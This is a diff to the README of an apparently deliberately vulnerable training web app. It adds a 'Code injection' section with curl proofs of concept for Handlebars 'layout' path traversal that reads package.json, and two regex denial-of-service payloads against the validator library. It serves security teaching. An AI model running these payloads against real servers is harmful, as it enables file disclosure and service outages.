@@ -59,10 +59,38 @@ Here are the exploitable vulnerable packages:
 
 * Open Redirect
 * NoSQL Injection
+* Code Injection
 * Command execution
 * Cross-site Scripting (XSS)
 * Security misconfiguration exposes server information 
 * Insecure protocol (HTTP) communication 
+
+#### Code injection
+
+The page at `/account_details` is rendered as an Handlebars view.
+
+The same view is used for both the GET request which shows the account details, as well as the form itself for a POST request which updates the account details. A so-called Server-side Rendering.
+
+The form is completely functional. The way it works is, it receives the profile information from the `req.body` and passes it, as-is to the template. This however means, that the attacker is able to control a variable that flows directly from the request into the view template library.
+
+You'd think that what's the worst that can happen because we use a validation to confirm the expected input, however the validation doesn't take into account a new field that can be added to the object, such as `layout`, which when passed to a template language, could lead to Local File Inclusion (Path Traversal) vulnerabilities. Here is a proof-of-concept showing it:
+
+```sh
+curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{"layout": "./../package.json"}' 'http://localhost:3001/account_details'
+```
+
+Actually, there's even another vulnerability in this code.
+The `validator` library that we use has several known regular expression denial of service vulnerabilities. One of them, is associated with the email regex, which if validated with the `{allow_display_name: true}` option then we can trigger a denial of service for this route:
+
+```sh
+curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"`seq -s "" -f "<" 100000`\"}" 'http://localhost:3001/account_details'
+```
+
+The `validator.rtrim()` sanitizer is also vulnerable, and we can use this to create a similar denial of service attack:
+
+```sh
+curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"someone@example.com\", \"country\": \"nop\", \"phone\": \"0501234123\", \"lastname\": \"nop\", \"firstname\": \"`node -e 'console.log(" ".repeat(100000) + "!")'`\"}" 'http://localhost:3001/account_details'
+```
 
 #### Open redirect
 
